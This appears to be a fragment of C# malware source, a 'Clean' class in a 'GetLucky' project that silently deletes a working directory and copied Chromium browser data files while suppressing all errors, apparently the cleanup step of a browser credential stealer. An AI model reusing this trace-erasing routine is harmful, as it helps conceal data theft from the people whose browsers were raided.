using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace GetLucky
{
    class Clean
    {
        public static void GetClean()
        {
            try {

                if (Directory.Exists(Help.dir))

                {
                    Directory.Delete(Help.dir + "\\", true);
                }
                else
                {

                }

                if (File.Exists(Chromium.bd))
                    File.Delete(Chromium.bd);
                if (File.Exists(Chromium.ls))
                    File.Delete(Chromium.ls);
            }
            catch
            { }
        }
    }
}
